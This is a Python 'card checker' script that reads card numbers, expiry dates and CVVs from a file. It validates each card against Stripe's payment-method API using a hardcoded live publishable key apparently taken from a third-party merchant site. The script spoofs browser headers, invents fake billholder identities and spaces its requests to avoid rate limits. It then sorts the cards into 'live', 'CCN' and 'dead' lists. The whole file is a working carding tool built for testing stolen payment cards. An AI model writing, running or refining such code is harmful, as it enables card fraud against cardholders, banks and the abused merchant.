"""
Pydroid Card Checker - Stripe Auth Gateway
Reads cards from txt file and checks them
Format: cc|mm|yy|cvv (one per line)
"""

import requests
import json
import random
import string
import time
import re
import os
import uuid
from datetime import datetime


VERSION = "2.0"


class StripeAuthChecker:
    def __init__(self, debug=False):
        self.pk_live = 'pk_live_517EDIQCV9djTjhnHFKHnXhM2atKmyZ7oVnyJbnX0DwYNHgeuZRZkxKeHlEUILFe9wVYe1NDS72D34fJgZVbZgCxS00Ghr637bG'
        self.debug = debug
        self.session = requests.Session()
        
        # Generate session identifiers
        self.guid = str(uuid.uuid4())
        self.muid = str(uuid.uuid4())
        self.sid = str(uuid.uuid4())
    
    def log_debug(self, title, data):
        """Print debug information"""
        if self.debug:
            print(f"\n{'#'*55}")
            print(f"### [DEBUG] {title}")
            print(f"{'#'*55}")
            if isinstance(data, dict):
                for key, value in data.items():
                    # Truncate long values
                    str_val = str(value)
                    if len(str_val) > 200:
                        str_val = str_val[:200] + "..."
                    print(f"  {key}: {str_val}")
            else:
                print(f"  {data}")
            print(f"{'#'*55}")

    def generate_email(self):
        """Generate random email"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f"{name}{random.randint(100, 999)}@{random.choice(domains)}"
    
    def generate_name(self):
        """Generate random name"""
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        return random.choice(first_names), random.choice(last_names)

    def create_payment_method(self, cc, month, year, cvv):
        """Create Stripe payment method - this validates the card"""
        
        first_name, last_name = self.generate_name()
        email = self.generate_email()
        
        url = 'https://api.stripe.com/v1/payment_methods'
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        # Format year properly
        if len(year) == 2:
            exp_year = year
        else:
            exp_year = year[-2:]
        
        data = {
            'billing_details[name]': f'{first_name} {last_name}',
            'billing_details[email]': email,
            'billing_details[phone]': f'{random.randint(200, 999)}{random.randint(1000000, 9999999)}',
            'billing_details[address][country]': 'US',
            'billing_details[address][postal_code]': f'{random.randint(10000, 99999)}',
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': month.zfill(2),
            'allow_redisplay': 'unspecified',
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent',
            'referrer': 'https://marsactu.fr',
            'time_on_page': str(random.randint(30000, 90000)),
            'guid': self.guid,
            'muid': self.muid,
            'sid': self.sid,
            'key': self.pk_live,
            '_stripe_version': '2024-06-20',
        }
        
        self.log_debug("STRIPE PAYMENT METHOD REQUEST", {
            'url': url,
            'card': f"{cc[:6]}******{cc[-4:]}",
            'exp': f"{month}/{exp_year}",
            'name': f"{first_name} {last_name}",
            'email': email
        })
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            
            self.log_debug("STRIPE PAYMENT METHOD RESPONSE", {
                'status_code': response.status_code,
                'response': result
            })
            
            return response.status_code, result
            
        except Exception as e:
            self.log_debug("STRIPE ERROR", str(e))
            return 0, {'error': {'message': str(e)}}

    def process_card(self, cc, month, year, cvv):
        """Process a single card and return result"""
        
        status_code, response = self.create_payment_method(cc, month, year, cvv)
        
        return self.parse_response(status_code, response)

    def parse_response(self, status_code, response):
        """Parse Stripe response and determine card status"""
        
        if status_code == 200 and response.get('id'):
            # Payment method created successfully - card is valid
            pm_id = response.get('id', 'N/A')
            card_info = response.get('card', {})
            brand = card_info.get('brand', 'Unknown')
            last4 = card_info.get('last4', '****')
            
            return {
                'success': True,
                'status': 'LIVE',
                'message': f'Card Valid - {brand.upper()} ****{last4} [PM: {pm_id[:20]}...]',
                'code': 'valid'
            }
        
        # Handle errors
        error = response.get('error', {})
        error_type = error.get('type', '')
        error_code = error.get('code', '')
        error_decline = error.get('decline_code', '')
        error_message = error.get('message', 'Unknown error')
        
        self.log_debug("PARSING ERROR", {
            'type': error_type,
            'code': error_code,
            'decline_code': error_decline,
            'message': error_message
        })
        
        # Card number errors - DEAD
        if error_code in ['incorrect_number', 'invalid_number']:
            return {
                'success': False,
                'status': 'DEAD',
                'message': 'Invalid Card Number',
                'code': error_code
            }
        
        # Expired card - DEAD
        if error_code in ['expired_card', 'invalid_expiry_year', 'invalid_expiry_month']:
            return {
                'success': False,
                'status': 'DEAD',
                'message': 'Card Expired',
                'code': error_code
            }
        
        # CVC errors - CCN (Card is live but wrong CVV)
        if error_code in ['incorrect_cvc', 'invalid_cvc']:
            return {
                'success': False,
                'status': 'CCN',
                'message': 'Invalid CVV - Card Live',
                'code': error_code
            }
        
        # Insufficient funds - LIVE
        if error_decline == 'insufficient_funds' or 'insufficient' in error_message.lower():
            return {
                'success': False,
                'status': 'LIVE',
                'message': 'Insufficient Funds - Card Live',
                'code': 'insufficient_funds'
            }
        
        # Do not honor - LIVE
        if error_decline in ['do_not_honor', 'generic_decline'] or 'do not honor' in error_message.lower():
            return {
                'success': False,
                'status': 'LIVE',
                'message': f'Do Not Honor - Card Live [{error_decline}]',
                'code': error_decline or 'do_not_honor'
            }
        
        # Transaction not allowed - LIVE
        if error_decline in ['transaction_not_allowed', 'restricted_card']:
            return {
                'success': False,
                'status': 'LIVE',
                'message': 'Transaction Not Allowed - Card Live',
                'code': error_decline
            }
        
        # 3D Secure / Authentication required - LIVE
        if error_code == 'card_declined' and error_decline in ['authentication_required', 'three_d_secure_required']:
            return {
                'success': False,
                'status': 'LIVE',
                'message': '3D Secure Required - Card Live',
                'code': '3ds_required'
            }
        
        # Lost/Stolen - DEAD
        if error_decline in ['lost_card', 'stolen_card', 'pickup_card']:
            return {
                'success': False,
                'status': 'DEAD',
                'message': 'Lost/Stolen Card',
                'code': error_decline
            }
        
        # Card declined with specific code
        if error_code == 'card_declined':
            if error_decline:
                # Some decline codes indicate live card
                live_declines = ['insufficient_funds', 'withdrawal_count_limit_exceeded', 
                                'card_velocity_exceeded', 'security_violation', 'service_not_allowed']
                if error_decline in live_declines:
                    return {
                        'success': False,
                        'status': 'LIVE',
                        'message': f'{error_decline.replace("_", " ").title()} - Card Live',
                        'code': error_decline
                    }
            
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f'Card Declined [{error_decline or "generic"}]',
                'code': error_decline or 'declined'
            }
        
        # Rate limit
        if error_code == 'rate_limit' or 'rate' in error_message.lower():
            return {
                'success': False,
                'status': 'RATE_LIMITED',
                'message': 'Rate Limited - Try Later',
                'code': 'rate_limit'
            }
        
        # Default - show the actual error
        return {
            'success': False,
            'status': 'DECLINED',
            'message': error_message or 'Unknown Error',
            'code': error_code or 'unknown'
        }


def extract_card(line):
    """Extract card details from line in format cc|mm|yy|cvv"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Try different separators
    for sep in ['|', ':', ' ']:
        parts = line.split(sep)
        if len(parts) >= 4:
            cc = parts[0].strip().replace(' ', '')
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()
            
            # Validate
            if cc.isdigit() and len(cc) >= 13 and len(cc) <= 19:
                if month.isdigit() and len(month) <= 2:
                    if year.isdigit() and len(year) >= 2:
                        if cvv.isdigit() and len(cvv) >= 3:
                            month = month.zfill(2)
                            if len(year) == 4:
                                year = year[2:]
                            return (cc, month, year, cvv)
    
    # Try regex
    match = re.search(r'(\d{13,19})[\|:\s](\d{1,2})[\|:\s](\d{2,4})[\|:\s](\d{3,4})', line)
    if match:
        cc, month, year, cvv = match.groups()
        month = month.zfill(2)
        if len(year) == 4:
            year = year[2:]
        return (cc, month, year, cvv)
    
    return None


def load_cards(filename):
    """Load cards from txt file"""
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                card = extract_card(line)
                if card:
                    cards.append(card)
    except FileNotFoundError:
        print(f"[!] File not found: {filename}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")
    return cards


def save_result(filename, card_line, result):
    """Append result to output file"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{card_line} | {result}\n")
    except Exception as e:
        print(f"[!] Error saving to {filename}: {e}")


def get_card_type(cc):
    """Determine card type from number"""
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')) or cc.startswith('2'):
        return 'MASTERCARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    elif cc.startswith('6'):
        return 'DISCOVER'
    else:
        return 'UNKNOWN'


def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    """Print checker banner"""
    banner = f"""
╔══════════════════════════════════════════════════════╗
║       STRIPE CARD CHECKER - PYDROID VERSION          ║
║            Auth Gateway (Payment Method)             ║
║                   Version: {VERSION}                       ║
╠══════════════════════════════════════════════════════╣
║  Format: cc|mm|yy|cvv  (one per line in cards.txt)   ║
╚══════════════════════════════════════════════════════╝
"""
    print(banner)


def print_result(card, result, index, total):
    """Print formatted result"""
    cc, month, year, cvv = card
    card_line = f"{cc}|{month}|{year}|{cvv}"
    card_type = get_card_type(cc)
    
    status = result.get('status', 'ERROR')
    message = result.get('message', 'Unknown')
    code = result.get('code', '')
    
    # Status symbols
    status_icons = {
        'LIVE': '[++] LIVE',
        'CCN': '[##] CCN',
        'DECLINED': '[--] DECLINED',
        'DEAD': '[xx] DEAD',
        'ERROR': '[!!] ERROR',
        'RATE_LIMITED': '[!!] RATE LIMITED',
        'UNKNOWN': '[??] UNKNOWN'
    }
    
    status_display = status_icons.get(status, f'[??] {status}')
    
    print(f"\n{'='*55}")
    print(f"[{index}/{total}] Checking...")
    print(f"  Card: {cc[:6]}******{cc[-4:]}")
    print(f"  Type: {card_type}")
    print(f"  Exp: {month}/{year}")
    print(f"  Status: {status_display}")
    print(f"  Response: {message}")
    if code:
        print(f"  Code: {code}")
    print(f"{'='*55}")
    
    return card_line, status


def main():
    clear_screen()
    print_banner()
    
    # Default filename
    default_file = "cards.txt"
    
    # Ask for input file
    print(f"\n[?] Enter cards file path (default: {default_file})")
    input_file = input(">>> ").strip()
    
    if not input_file:
        input_file = default_file
    
    # Ask for debug mode
    print(f"\n[?] Enable debug mode to see API calls? (y/n, default: n)")
    debug_input = input(">>> ").strip().lower()
    debug_mode = debug_input in ['y', 'yes', '1', 'true']
    
    if debug_mode:
        print("[*] DEBUG MODE ON - showing full API requests/responses")
    else:
        print("[*] Debug mode OFF")
    
    # Load cards
    print(f"\n[*] Loading cards from: {input_file}")
    cards = load_cards(input_file)
    
    if not cards:
        print("[!] No valid cards found!")
        print("[*] Make sure file exists and contains cards in format: cc|mm|yy|cvv")
        return
    
    print(f"[+] Loaded {len(cards)} cards")
    
    # Create output files with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    live_file = f"live_{timestamp}.txt"
    ccn_file = f"ccn_{timestamp}.txt"
    dead_file = f"dead_{timestamp}.txt"
    
    # Stats
    stats = {
        'live': 0,
        'ccn': 0,
        'declined': 0,
        'dead': 0,
        'errors': 0
    }
    
    # Initialize checker with debug mode
    checker = StripeAuthChecker(debug=debug_mode)
    
    print(f"\n[*] Starting checker...")
    print(f"[*] Output files: {live_file}, {ccn_file}, {dead_file}")
    print(f"\n{'='*55}")
    
    start_time = time.time()
    
    for idx, card in enumerate(cards, 1):
        cc, month, year, cvv = card
        
        try:
            result = checker.process_card(cc, month, year, cvv)
            card_line, status = print_result(card, result, idx, len(cards))
            
            # Save based on status
            if status == 'LIVE':
                stats['live'] += 1
                save_result(live_file, card_line, f"LIVE | {result.get('message', '')} | {result.get('code', '')}")
            elif status == 'CCN':
                stats['ccn'] += 1
                save_result(ccn_file, card_line, f"CCN | {result.get('message', '')} | {result.get('code', '')}")
            elif status == 'DEAD':
                stats['dead'] += 1
                save_result(dead_file, card_line, f"DEAD | {result.get('message', '')} | {result.get('code', '')}")
            else:
                stats['declined'] += 1
                save_result(dead_file, card_line, f"DECLINED | {result.get('message', '')} | {result.get('code', '')}")
            
            # Small delay to avoid rate limiting
            time.sleep(random.uniform(2.0, 4.0))
            
        except Exception as e:
            stats['errors'] += 1
            print(f"\n[!] Error processing card {idx}: {e}")
            time.sleep(2)
    
    # Final stats
    elapsed = time.time() - start_time
    
    print(f"\n{'='*55}")
    print("              CHECKING COMPLETE")
    print(f"{'='*55}")
    print(f"  Total Cards: {len(cards)}")
    print(f"  Live: {stats['live']}")
    print(f"  CCN: {stats['ccn']}")
    print(f"  Declined: {stats['declined']}")
    print(f"  Dead: {stats['dead']}")
    print(f"  Errors: {stats['errors']}")
    print(f"  Time: {elapsed:.2f}s")
    print(f"{'='*55}")
    print(f"  Results saved to:")
    print(f"    - {live_file} (Live cards)")
    print(f"    - {ccn_file} (CCN - wrong CVV)")
    print(f"    - {dead_file} (Dead/Declined)")
    print(f"{'='*55}\n")


if __name__ == "__main__":
    main()
